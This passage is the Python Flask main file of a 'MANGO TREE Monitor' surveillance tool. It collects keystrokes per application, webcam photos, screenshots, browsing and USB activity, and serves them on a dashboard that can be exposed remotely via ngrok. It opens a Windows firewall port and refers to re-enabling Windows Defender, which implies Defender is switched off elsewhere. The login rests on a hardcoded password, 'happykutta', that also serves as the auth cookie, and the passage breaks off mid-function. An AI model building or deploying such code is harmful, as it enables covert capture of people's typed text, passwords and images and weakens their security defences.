import os
import time
import json
import socket
import threading
import logging
import subprocess
import sys
import signal
import netifaces
import requests
from datetime import datetime, timedelta
from dateutil import parser
import tkinter as tk
from tkinter import ttk, messagebox
from flask import Flask, render_template, jsonify, send_from_directory, request, Response, redirect, url_for, make_response
from functools import wraps
from pyngrok import ngrok, conf
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from collections import defaultdict

# Import monitoring components
from activity_tracker import ActivityTracker
from screenshot_taker import SmartScreenshotTaker
from website_tracker import WebsiteTracker
from internet_monitor import InternetMonitor
from usb_monitor_advanced import USBMonitorAdvanced
from app_usage_tracker import AppUsageTracker
from keystroke_logger_by_app import KeystrokeLoggerByApp
from webcam_capture import WebcamCapture
from live_monitor import LiveMonitor
# from audio_monitor import AudioMonitor

# Configure logging
logging.basicConfig(
    level=logging.WARNING,  # Set to WARNING for production
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Global variables
CONFIG_FILE = 'monitor_config.json'
live_monitor = None
audio_monitor = None
internet_monitor = None
screenshot_taker = None
webcam_capture = None
keystroke_logger = None
usb_monitor = None
app_tracker = None
activity_tracker = None
ngrok_tunnel = None

# Monitor states
monitor_states = {
    'screen': True,
    'webcam': True,
    'keystroke': True,
    'usb': True,
    'internet': True,
    'app': True
}

class SetupDialog:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("MANGO TREE Monitor Setup")
        self.root.geometry("500x600")
        self.root.resizable(False, False)
        
        # Set window icon if available
        try:
            if os.path.exists("logo-1-1.webp"):
                icon = tk.PhotoImage(file="logo-1-1.webp")
                self.root.iconphoto(True, icon)
        except:
            pass

        # Create main frame with padding
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # Branding
        title_frame = ttk.Frame(main_frame)
        title_frame.grid(row=0, column=0, pady=(0, 20), sticky=tk.W)
        
        title_label = ttk.Label(
            title_frame, 
            text="MANGO TREE TECHNOLOGY",
            font=("Arial", 20, "bold")
        )
        title_label.grid(row=0, column=0, sticky=tk.W)
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Created by Yeshaswi Singh",
            font=("Arial", 12, "italic")
        )
        subtitle_label.grid(row=1, column=0, sticky=tk.W)

        # Separator
        ttk.Separator(main_frame, orient='horizontal').grid(
            row=1, column=0, pady=10, sticky=(tk.W, tk.E)
        )

        # Monitor Name
        ttk.Label(main_frame, text="Monitor Name:", font=("Arial", 10, "bold")).grid(
            row=2, column=0, pady=(10, 5), sticky=tk.W
        )
        self.name_var = tk.StringVar()
        name_entry = ttk.Entry(main_frame, textvariable=self.name_var, width=40)
        name_entry.grid(row=3, column=0, sticky=tk.W)
        name_entry.focus()

        # Port Number
        ttk.Label(main_frame, text="Port Number:", font=("Arial", 10, "bold")).grid(
            row=4, column=0, pady=(20, 5), sticky=tk.W
        )
        self.port_var = tk.StringVar(value="5050")
        port_entry = ttk.Entry(main_frame, textvariable=self.port_var, width=40)
        port_entry.grid(row=5, column=0, sticky=tk.W)

        # Ngrok Token
        ttk.Label(main_frame, text="Ngrok Token (Optional):", font=("Arial", 10, "bold")).grid(
            row=6, column=0, pady=(20, 5), sticky=tk.W
        )
        self.ngrok_var = tk.StringVar()
        ngrok_entry = ttk.Entry(main_frame, textvariable=self.ngrok_var, width=40)
        ngrok_entry.grid(row=7, column=0, sticky=tk.W)
        
        # Ngrok Help Text
        help_text = "Get your token from: https://dashboard.ngrok.com/get-started/your-authtoken"
        ttk.Label(main_frame, text=help_text, font=("Arial", 8), foreground="gray").grid(
            row=8, column=0, pady=(0, 20), sticky=tk.W
        )

        # Separator
        ttk.Separator(main_frame, orient='horizontal').grid(
            row=9, column=0, pady=20, sticky=(tk.W, tk.E)
        )

        # Start Button
        start_button = ttk.Button(
            main_frame, 
            text="Start Monitor",
            command=self.start_monitor,
            style='Accent.TButton'
        )
        start_button.grid(row=10, column=0, pady=(0, 20))

        # Configure style for accent button
        style = ttk.Style()
        style.configure('Accent.TButton', font=('Arial', 12, 'bold'))

        # Center the window
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')

    def validate_inputs(self):
        """Validate user inputs"""
        name = self.name_var.get().strip()
        if not name:
            messagebox.showerror("Error", "Please enter a monitor name")
            return False

        try:
            port = int(self.port_var.get())
            if port < 1024 or port > 65535:
                messagebox.showerror("Error", "Port must be between 1024 and 65535")
                return False
        except ValueError:
            messagebox.showerror("Error", "Port must be a number")
            return False

        return True

    def start_monitor(self):
        """Validate and save configuration"""
        if not self.validate_inputs():
            return

        self.config = {
            'username': self.name_var.get().strip(),
            'port': int(self.port_var.get()),
            'ngrok_token': self.ngrok_var.get().strip() or None
        }
        self.root.quit()

    def show(self):
        """Show the dialog and return configuration"""
        self.config = None
        self.root.mainloop()
        self.root.destroy()
        return self.config

def load_config():
    """Load configuration from file"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        return None
    except Exception as e:
        logger.error(f"Error loading config: {str(e)}")
        return None

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
        return config
    except Exception as e:
        logger.error(f"Error saving config: {str(e)}")
        return None

def get_user_config():
    """Get or create user configuration"""
    try:
        config = load_config()
        if not config:
            # Show setup dialog
            dialog = SetupDialog()
            config = dialog.show()
            if config:
                save_config(config)
            else:
                return None
        return config
    except Exception as e:
        logger.error(f"Error getting user config: {str(e)}")
        return None

def ensure_log_directories():
    """Create necessary log directories"""
    directories = [
        "logs",
        os.path.join("logs", "screenshots"),
        os.path.join("logs", "audio"),
        "WebcamLogs",
        "static",
        os.path.join("static", "screenshots"),
        os.path.join("static", "webcam"),
        "templates"
    ]
    
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            logger.info(f"Created directory: {directory}")

def test_port_available(port):
    """Test if port is available"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', port))
        sock.close()
        return True
    except:
        return False

def find_available_port(start_port=5050):
    """Find an available port starting from given port"""
    port = start_port
    while port < 65535:
        if test_port_available(port):
            return port
        port += 1
    return None

def add_firewall_rule(port):
    """Add Windows Firewall rule for the application"""
    if sys.platform == 'win32':
        try:
            # Check if rule already exists
            check_cmd = f'netsh advfirewall firewall show rule name="Monitor Dashboard {port}"'
            try:
                subprocess.check_output(check_cmd, shell=True)
                logger.info("Firewall rule already exists")
                return True
            except:
                pass

            # Add new rule
            cmd = f'netsh advfirewall firewall add rule name="Monitor Dashboard {port}" dir=in action=allow protocol=TCP localport={port}'
            subprocess.check_output(cmd, shell=True)
            logger.info("Added firewall rule successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to add firewall rule: {str(e)}")
            return False
    return True

def cleanup_and_exit():
    """Clean up resources before exiting"""
    try:
        logger.info("Starting cleanup process...")
        
        # Stop all monitors
        if live_monitor:
            live_monitor.stop()
        if audio_monitor:
            audio_monitor.stop()
        if internet_monitor:
            internet_monitor.stop()
        if screenshot_taker:
            screenshot_taker.stop()
        if webcam_capture:
            webcam_capture.stop()
        if keystroke_logger:
            keystroke_logger.stop()
        if usb_monitor:
            usb_monitor.stop()
        if app_tracker:
            app_tracker.stop()
        if activity_tracker:
            activity_tracker.stop()
            
        # Clean up ngrok
        if ngrok_tunnel:
            try:
                ngrok.disconnect(ngrok_tunnel.public_url)
                ngrok.kill()
            except:
                pass
        
        # Re-enable Windows Defender if it was disabled
        try:
            re_enable_defender()
        except:
            pass
                
        logger.info("Cleanup completed")
    except Exception as e:
        logger.error(f"Error during cleanup: {str(e)}")
    sys.exit(0)

def start_flask(host, port):
    """Start Flask server"""
    try:
        app.run(
            host=host,
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Failed to start server: {str(e)}")

# Initialize Flask app
app = Flask(__name__)
app.config['SERVER_NAME'] = None
app.secret_key = os.urandom(24)

# Add session secret key for security
app.secret_key = os.urandom(24)

# Global authentication check
@app.before_request
def check_auth():
    """Check authentication for all routes except login and static files"""
    # List of routes that don't require authentication
    public_paths = ['/login', '/auth', '/static', '/logout']
    
    # Allow public routes
    if any(request.path.startswith(path) for path in public_paths):
        return None
        
    # Check authentication for all other routes
    auth_cookie = request.cookies.get('auth')
    if not auth_cookie or auth_cookie != 'happykutta':
        # If it's an API route, return JSON response
        if request.path.startswith('/api/'):
            return jsonify({
                'success': False,
                'error': 'Authentication required',
                'message': 'Please log in to access this resource'
            }), 401
        # For other routes, redirect to login
        return redirect(url_for('login'))

def login_required(f):
    """Decorator for routes that require login"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_cookie = request.cookies.get('auth')
        if not auth_cookie or auth_cookie != 'happykutta':
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Root route - always show login first"""
    return redirect(url_for('login'))

@app.route('/login')
def login():
    """Login page route"""
    # Clear any existing auth cookie
    response = make_response(render_template('login.html'))
    response.delete_cookie('auth')
    return response

@app.route('/auth', methods=['POST'])
def auth():
    """Authentication endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'success': False,
                'error': 'No data provided'
            }), 400

        password = data.get('password')
        if not password:
            return jsonify({
                'success': False,
                'error': 'Password is required'
            }), 400

        if password == 'happykutta':
            response = jsonify({
                'success': True,
                'message': 'Login successful',
                'redirect': '/dashboard'
            })
            response.set_cookie('auth', 'happykutta', httponly=True)
            return response

        return jsonify({
            'success': False,
            'error': 'Invalid password'
        }), 401

    except Exception as e:
        print(f"Login error: {str(e)}")
        return jsonify({
            'success': False,
            'error': 'Server error'
        }), 500

@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard route - protected by login"""
    try:
        config = load_config()
        if not config:
            return redirect(url_for('login'))
        return render_template('index.html', username=config['username'])
    except Exception as e:
        return redirect(url_for('login'))

@app.route('/logout')
def logout():
    """Logout route - clear auth and redirect to login"""
    response = redirect(url_for('login'))
    response.delete_cookie('auth')
    return response

def get_datetime_filters():
    """Get datetime filter parameters from request"""
    try:
        from_date = request.args.get('fromDate', datetime.now().strftime("%Y-%m-%d"))
        from_time = request.args.get('fromTime', "00:00")
        to_date = request.args.get('toDate', datetime.now().strftime("%Y-%m-%d"))
        to_time = request.args.get('toTime', "23:59")
        
        from_datetime = datetime.strptime(f"{from_date} {from_time}", "%Y-%m-%d %H:%M")
        to_datetime = datetime.strptime(f"{to_date} {to_time}", "%Y-%m-%d %H:%M")
        
        return from_datetime, to_datetime
    except:
        # Default to today
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        return today, today.replace(hour=23, minute=59, second=59)

def is_within_timerange(timestamp_str, from_datetime, to_datetime):
    """Check if timestamp is within the specified range"""
    try:
        timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S')
        return from_datetime <= timestamp <= to_datetime
    except:
        return False

@app.route('/api/activity')
@login_required
def api_activity():
    """Get activity data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        data = []
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
            
        # Create window log file if it doesn't exist
        log_file = os.path.join('logs', 'window_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
            
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    try:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                        if from_datetime <= dt <= to_datetime:
                            activity = line[line.find(']')+1:].strip()
                            data.append([
                                timestamp,
                                'Window Activity',
                                activity
                            ])
                    except:
                        continue
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_activity: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/website')
@login_required
def api_website():
    """Get website history data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        data = []
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create website log file if it doesn't exist
        log_file = os.path.join('logs', 'website_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    try:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                        if from_datetime <= dt <= to_datetime:
                            website_info = line[line.find(']')+1:].strip()
                            if ' - ' in website_info:
                                parts = website_info.split(' - ')
                                data.append([
                                    timestamp,
                                    parts[0].strip(),  # Browser
                                    parts[1].strip(),  # URL
                                    parts[2].strip() if len(parts) > 2 else 'Unknown'  # Title
                                ])
                    except:
                        continue
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_website: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

def format_size(bytes_size):
    """Format bytes into human readable size"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.2f} {unit}"
        bytes_size /= 1024.0
    return f"{bytes_size:.2f} PB"

def convert_to_bytes(size_str):
    """Convert a human readable size to bytes"""
    units = {'B': 1, 'KB': 1024, 'MB': 1024**2, 'GB': 1024**3, 'TB': 1024**4, 'PB': 1024**5}
    number = float(size_str.split()[0])
    unit = size_str.split()[1]
    return int(number * units[unit])

@app.route('/api/internet')
@login_required
def api_internet():
    """Get internet usage data"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
            
        # Create internet log file if it doesn't exist
        log_file = os.path.join('logs', 'internet_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        # Get data for the requested date range
        data = defaultdict(lambda: {'sent': 0, 'recv': 0})
        
        try:
            with open(log_file, 'r') as f:
                for line in f:
                    if line.strip():
                        try:
                            # Parse CSV format: timestamp,app_name,sent_bytes,received_bytes
                            timestamp, app_name, sent, recv = line.strip().split(',')
                            dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                            
                            if from_datetime <= dt <= to_datetime:
                                data[app_name]['sent'] += int(sent)
                                data[app_name]['recv'] += int(recv)
                        except Exception as e:
                            print(f"Error parsing line: {line.strip()} - {str(e)}")
                            continue
        except Exception as e:
            print(f"Error reading internet log: {str(e)}")
        
        # Convert data to table format
        table_data = []
        for app_name, usage in data.items():
            sent_bytes = usage['sent']
            recv_bytes = usage['recv']
            total_bytes = sent_bytes + recv_bytes
            
            if total_bytes > 0:  # Only include apps with actual usage
                table_data.append([
                    app_name,
                    format_size(sent_bytes),
                    format_size(recv_bytes),
                    format_size(total_bytes)
                ])
        
        # Sort by total usage (descending)
        table_data.sort(key=lambda x: convert_to_bytes(x[3]), reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(table_data),
            'recordsFiltered': len(table_data),
            'data': table_data
        })
        
    except Exception as e:
        print(f"Error in api_internet: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/usb')
@login_required
def api_usb():
    try:
        data = []
        with open('logs/usb_activity_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if '[' in line and ']' in line:
                    timestamp = line[line.find('[')+1:line.find(']')]
                    event_info = line[line.find(']')+1:].strip()
                    if ' - ' in event_info:
                        event, device = event_info.split(' - ', 1)
                        data.append([
                            timestamp,
                            event,
                            device,
                            'Connected' if 'Connected' in event else 'Disconnected'
                        ])
        return jsonify({
            'draw': 1,
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        return jsonify({
            'draw': 1,
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/apps')
@login_required
def api_apps():
    """Get application usage data"""
    try:
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create app usage log file if it doesn't exist
        log_file = os.path.join('logs', 'app_usage_log.txt')
        if not os.path.exists(log_file):
            open(log_file, 'a').close()
        
        data = []
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:  # Only process non-empty lines with a colon
                        try:
                            app_name, duration = line.split(':', 1)
                            app_name = app_name.strip()
                            duration = duration.strip()
                            
                            # Use current time as last_used
                            last_used = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            
                            # Only add if we have both app name and duration
                            if app_name and duration:
                                data.append([
                                    app_name,
                                    duration,
                                    last_used
                                ])
                        except Exception as e:
                            print(f"Error parsing app usage line: {line} - {str(e)}")
                            continue
        except Exception as e:
            print(f"Error reading app usage log: {str(e)}")
        
        # Sort by duration (assuming format like "X hours Y minutes" or "X minutes")
        def parse_duration(duration_str):
            try:
                total_minutes = 0
                if 'hours' in duration_str:
                    hours = int(duration_str.split('hours')[0].strip())
                    total_minutes += hours * 60
                    # Check for additional minutes after hours
                    if 'minutes' in duration_str:
                        minutes = int(duration_str.split('minutes')[0].split()[-1].strip())
                        total_minutes += minutes
                elif 'hour' in duration_str and 'hours' not in duration_str:
                    hours = int(duration_str.split('hour')[0].strip())
                    total_minutes += hours * 60
                    # Check for additional minutes after hour
                    if 'minutes' in duration_str:
                        minutes = int(duration_str.split('minutes')[0].split()[-1].strip())
                        total_minutes += minutes
                elif 'minutes' in duration_str:
                    minutes = int(duration_str.split('minutes')[0].strip())
                    total_minutes += minutes
                elif 'minute' in duration_str and 'minutes' not in duration_str:
                    minutes = int(duration_str.split('minute')[0].strip())
                    total_minutes += minutes
                return total_minutes
            except:
                return 0  # Return 0 for "Less than a minute" or invalid formats
        
        # Sort by duration in descending order
        data.sort(key=lambda x: parse_duration(x[1]), reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
        
    except Exception as e:
        print(f"Error in api_apps: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/keystroke_content')
@login_required
def api_keystroke_content():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        application = request.args.get('application', '')
        
        if not application:
            return jsonify({'content': []})
            
        content = []
        
        # Get all keystroke log files in the logs directory
        log_files = [f for f in os.listdir('logs') if f.startswith('keystrokes_') and f.endswith('.txt')]
        
        for log_file in log_files:
            file_path = os.path.join('logs', log_file)
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_timestamp = None
                    current_app = None
                    current_text = None
                    
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                            
                        if line.startswith('['):
                            # If we have accumulated text, save it
                            if current_text and current_app == application:
                                content.append({
                                    'timestamp': current_timestamp,
                                    'content': current_text.strip()
                                })
                            current_text = None
                            
                            # Parse timestamp and app info
                            timestamp = line[line.find('[')+1:line.find(']')]
                            if not is_within_timerange(timestamp, from_datetime, to_datetime):
                                current_app = None
                                continue
                                
                            app_info = line[line.find(']')+1:].strip()
                            if ' - ' in app_info:
                                current_app = app_info.split(' - ')[0].strip()
                                current_timestamp = timestamp
                                
                        elif line.startswith('Text:') and current_app == application:
                            # Get the actual text content
                            current_text = line.replace('Text:', '').strip()
                    
                    # Save any remaining text
                    if current_text and current_app == application:
                        content.append({
                            'timestamp': current_timestamp,
                            'content': current_text.strip()
                        })
                        
            except Exception as e:
                print(f"Error reading keystroke file {log_file}: {str(e)}")
                continue
        
        # Sort by timestamp in descending order
        content.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return jsonify({'content': content})
        
    except Exception as e:
        print(f"Error in api_keystroke_content: {str(e)}")
        return jsonify({'content': []})

@app.route('/api/keystrokes')
@login_required
def api_keystrokes():
    """Get keystroke statistics"""
    try:
        from_datetime, to_datetime = get_datetime_filters()
        
        # Ensure logs directory exists
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Initialize counts dictionary
        app_counts = defaultdict(int)
        app_last_date = {}
        
        # Get all keystroke log files
        log_files = [f for f in os.listdir('logs') if f.startswith('keystrokes_') and f.endswith('.txt')]
        
        # Process each log file
        for log_file in log_files:
            file_path = os.path.join('logs', log_file)
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_app = None
                    current_timestamp = None
                    
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        
                        if line.startswith('['):
                            # Parse timestamp and app info
                            timestamp = line[line.find('[')+1:line.find(']')]
                            try:
                                dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                                if from_datetime <= dt <= to_datetime:
                                    app_info = line[line.find(']')+1:].strip()
                                    if ' - ' in app_info:
                                        current_app = app_info.split(' - ')[0].strip()
                                        current_timestamp = timestamp
                                        app_last_date[current_app] = dt.strftime("%Y-%m-%d")
                            except:
                                current_app = None
                                continue
                        elif line.startswith('Text:') and current_app:
                            # Count characters in the text
                            text = line.replace('Text:', '').strip()
                            app_counts[current_app] += len(text)
            except:
                continue
        
        # Convert to DataTables format
        data = [
            [
                app_last_date.get(app, datetime.now().strftime("%Y-%m-%d")),
                app,
                count
            ]
            for app, count in app_counts.items()
            if count > 0  # Only include apps with keystrokes
        ]
        
        # Sort by keystroke count in descending order
        data.sort(key=lambda x: x[2], reverse=True)
        
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': len(data),
            'recordsFiltered': len(data),
            'data': data
        })
    except Exception as e:
        print(f"Error in api_keystrokes: {str(e)}")
        return jsonify({
            'draw': int(request.args.get('draw', 1)),
            'recordsTotal': 0,
            'recordsFiltered': 0,
            'data': []
        })

@app.route('/api/screenshots')
@login_required
def api_screenshots():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        screenshots_dir = os.path.join('logs', 'screenshots')
        screenshots = []
        
        for filename in os.listdir(screenshots_dir):
            if filename.endswith(('.png', '.jpg')):
                timestamp = filename.replace('screenshot_', '').replace('.png', '').replace('.jpg', '')
                try:
                    dt = datetime.strptime(timestamp, '%Y%m%d_%H%M%S')
                    if from_datetime <= dt <= to_datetime:
                        formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                        screenshots.append({
                            'url': f'/static/screenshots/{filename}',  # Updated path
                            'timestamp': formatted_time
                        })
                except:
                    continue
        
        return jsonify({'screenshots': sorted(screenshots, key=lambda x: x['timestamp'], reverse=True)})
    except Exception as e:
        print(f"Error in api_screenshots: {str(e)}")
        return jsonify({'screenshots': []})

@app.route('/api/webcam')
@login_required
def api_webcam():
    try:
        from_datetime, to_datetime = get_datetime_filters()
        webcam_dir = 'WebcamLogs'
        captures = []
        
        for filename in os.listdir(webcam_dir):
            if filename.endswith(('.jpg', '.png')):
                timestamp = filename.replace('capture_', '').replace('.jpg', '').replace('.png', '')
                try:
                    dt = datetime.strptime(timestamp, '%Y-%m-%d_%H-%M-%S')
                    if from_datetime <= dt <= to_datetime:
                        formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                        captures.append({
                            'url': f'/static/webcam/{filename}',  # Updated path
                            'timestamp': formatted_time
                        })
                except:
                    continue
        
        return jsonify({'captures': sorted(captures, key=lambda x: x['timestamp'], reverse=True)})
    except Exception as e:
        print(f"Error in api_webcam: {str(e)}")
        return jsonify({'captures': []})

@app.route('/api/monitor/toggle', methods=['POST'])
@login_required
def toggle_monitor():
    """Toggle monitor status"""
    try:
        data = request.get_json()
        monitor = data.get('monitor')
        enabled = data.get('enabled')
        
        if monitor not in monitor_states:
            return jsonify({'error': 'Invalid monitor type'}), 400
            
        monitor_states[monitor] = enabled
        
        # Update the corresponding monitor
        if monitor == 'screen' and screenshot_taker:
            if enabled:
                screenshot_taker.start()
            else:
                screenshot_taker.stop()
        elif monitor == 'webcam' and webcam_capture:
            if enabled:
                webcam_capture.start()
            else:
                webcam_capture.stop()
        elif monitor == 'keystroke' and keystroke_logger:
            if enabled:
                keystroke_logger.start()
            else:
                keystroke_logger.stop()
        elif monitor == 'usb' and usb_monitor:
            if enabled:
                usb_monitor.start()
            else:
                usb_monitor.stop()
        elif monitor == 'internet' and internet_monitor:
            if enabled:
                internet_monitor.start()
            else:
                internet_monitor.stop()
        elif monitor == 'app' and app_tracker:
            if enabled:
                app_tracker.start()
            else:
                app_tracker.stop()
            
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error toggling monitor: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/monitor/status')
@login_required
def get_monitor_status():
    """Get status of all monitors"""
    try:
        return jsonify({
            'screen': monitor_states['screen'],
            'webcam': monitor_states['webcam'],
            'keystroke': monitor_states['keystroke'],
            'usb': monitor_states['usb'],
            'internet': monitor_states['internet'],
            'app': monitor_states['app']
        })
    except Exception as e:
        logger.error(f"Error getting monitor status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/dashboard/stats')
@login_required
def api_dashboard_stats():
    """Get quick stats for the dashboard"""
    try:
        # Get unique website count
        unique_domains = set()
        try:
            with open('logs/website_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '] Chrome - ' in line or '] Edge - ' in line or '] Firefox - ' in line:
                        # Extract website URL
                        parts = line.split(' - ')
                        if len(parts) > 1:
                            url = parts[1].strip()
                            # Clean and normalize the URL
                            try:
                                from urllib.parse import urlparse
                                parsed = urlparse(url)
                                # Get domain without www.
                                domain = parsed.netloc
                                if domain.startswith('www.'):
                                    domain = domain[4:]
                                # Handle cases where parsing fails
                                if not domain and '/' in url:
                                    domain = url.split('/')[0]
                                if not domain:
                                    domain = url
                                # Add to unique domains set
                                if domain:
                                    unique_domains.add(domain.lower())
                            except:
                                # If URL parsing fails, use the original URL
                                if url:
                                    unique_domains.add(url.lower())
        except Exception as e:
            logger.error(f"Error reading website log: {str(e)}")

        website_count = len(unique_domains)
        
        # Get app count
        app_count = 0
        unique_apps = set()
        with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if ':' in line:
                    app = line.split(':')[0].strip()
                    unique_apps.add(app)
            app_count = len(unique_apps)
        
        # Calculate active time today
        active_time = 0
        today = datetime.now().strftime("%Y-%m-%d")
        with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if ':' in line:
                    duration = line.split(':')[1].strip()
                    active_time += parse_duration(duration)
        
        hours = active_time // 3600
        minutes = (active_time % 3600) // 60
        active_time_formatted = f"{hours}h {minutes}m"
        
        return jsonify({
            'website_count': website_count,
            'app_count': app_count,
            'active_time': active_time_formatted
        })
    except Exception as e:
        logger.error(f"Error getting dashboard stats: {str(e)}")
        return jsonify({
            'website_count': 0,
            'app_count': 0,
            'active_time': '0h 0m'
        })

@app.route('/api/dashboard/app_usage')
@login_required
def api_dashboard_app_usage():
    """Get app usage data for pie chart"""
    try:
        app_usage = {}
        
        # Read the app usage data from JSON file
        data_file = os.path.join('logs', 'app_usage_data.json')
        if os.path.exists(data_file):
            with open(data_file, 'r') as f:
                data = json.load(f)
                if data['date'] == datetime.now().strftime("%Y-%m-%d"):
                    app_usage = data['usage']
        
        if not app_usage:
            # Fallback to log file if JSON doesn't exist
            with open('logs/app_usage_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line and '=' not in line:  # Skip header lines
                        app, duration = line.strip().split(':', 1)
                        app = app.strip()
                        seconds = parse_duration(duration.strip())
                        app_usage[app] = seconds
        
        # Sort by usage and get top 5
        sorted_apps = sorted(app_usage.items(), key=lambda x: x[1], reverse=True)[:5]
        
        # Add "Others" category
        others = sum(app_usage[app] for app in app_usage if app not in dict(sorted_apps))
        if others > 0:
            sorted_apps.append(('Others', others))
        
        # Convert seconds to minutes for better readability
        labels = [app for app, _ in sorted_apps]
        data = [round(seconds/60, 1) for _, seconds in sorted_apps]  # Convert to minutes
        
        return jsonify({
            'labels': labels,
            'data': data
        })
    except Exception as e:
        logger.error(f"Error getting app usage data: {str(e)}")
        return jsonify({
            'labels': [],
            'data': []
        })

@app.route('/api/dashboard/recent_activity')
@login_required
def api_dashboard_recent_activity():
    """Get recent activity for timeline"""
    try:
        activities = []
        
        # Get recent window activity
        try:
            with open('logs/window_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '[' in line and ']' in line:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        activity = line[line.find(']')+1:].strip()
                        activities.append({
                            'type': 'window',
                            'timestamp': timestamp,
                            'details': activity
                        })
        except:
            pass
        
        # Get recent website visits
        try:
            with open('logs/website_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '[' in line and ']' in line:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        if ' - ' in line:
                            browser, website = line[line.find(']')+1:].strip().split(' - ', 1)
                            activities.append({
                                'type': 'website',
                                'timestamp': timestamp,
                                'details': f"Visited {website} using {browser}"
                            })
        except:
            pass
        
        # Sort by timestamp and get latest 20
        activities.sort(key=lambda x: x['timestamp'], reverse=True)
